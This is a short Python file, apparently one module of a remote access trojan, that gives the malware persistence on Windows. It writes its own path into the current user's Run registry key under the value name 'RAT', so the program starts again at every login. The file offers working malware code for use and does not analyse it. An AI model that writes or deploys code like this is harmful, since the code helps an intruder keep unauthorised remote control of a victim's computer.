# persistence.py

import os
import platform

# Persistence (for Windows example)
def add_to_startup():
    if platform.system() == "Windows":
        file_path = os.path.realpath(__file__)
        os.system(f'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v RAT /d "{file_path}"')
